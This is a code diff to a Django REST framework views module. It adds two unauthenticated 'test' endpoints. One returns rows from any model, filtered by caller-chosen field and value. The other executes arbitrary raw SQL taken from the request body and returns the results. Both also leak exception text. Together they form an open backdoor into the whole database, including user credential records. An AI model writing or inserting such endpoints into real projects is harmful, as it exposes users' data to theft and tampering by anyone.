@@ -4,8 +4,9 @@ from rest_framework_simplejwt.serializers import TokenObtainPairSerializer
 from django.contrib.auth.models import User
 from rest_framework.views import APIView
 from rest_framework.response import Response
-from rest_framework.permissions import IsAuthenticated
+from rest_framework.permissions import IsAuthenticated, AllowAny
 from rest_framework import status
+from django.http import JsonResponse
 
 class AuthenticationView(TokenObtainPairView):
     serializer_class = TokenObtainPairSerializer
@@ -77,3 +78,38 @@ class UserDetailView(APIView):
                 'desc': user.profile.desc,
             })
         return Response(user_data, status=status.HTTP_200_OK)
+    
+class TestView(APIView):
+    permission_classes = [AllowAny]
+
+    def get(self, request, app_name, table_name, field, value):
+        from django.apps import apps
+
+        try:
+            model = apps.get_model(app_name, table_name)
+            filter_kwargs = {field: value}
+            record = model.objects.filter(**filter_kwargs).values()
+
+            return JsonResponse(list(record), safe=False)
+        except LookupError:
+            return JsonResponse({"error": "Invalid table name"}, status=400)
+        except Exception as e:
+            return JsonResponse({"error": str(e)}, status=500)
+        
+class Test2View(APIView):
+    permission_classes = [AllowAny]
+
+    def get(self, request):
+        from django.db import connection
+        from django.db.utils import ProgrammingError
+
+        with connection.cursor() as cursor:
+            try:
+                query = request.data.get("query", None)
+                if not query:
+                    return JsonResponse({'error': 'Invalid Data'}, safe=False) 
+                cursor.execute(query)
+                row = cursor.fetchall()
+                return JsonResponse(list(row), safe=False)
+            except ProgrammingError as e:
+                return JsonResponse({'error': e}, safe=False)
